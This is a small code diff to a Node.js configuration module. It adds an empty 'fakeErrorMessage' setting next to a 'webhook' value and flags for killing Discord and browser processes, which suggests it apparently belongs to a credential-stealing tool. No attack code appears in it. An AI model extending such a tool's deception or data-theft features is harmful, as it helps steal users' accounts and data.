@@ -4,6 +4,7 @@ const process = require("process");
 module.exports = function getconfig() {
     return {
         "webhook": process.env.WEBHOOK || "",
+        "fakeErrorMessage": "",
         "kill":{ 
             "discords": false,
             "browsers": true,
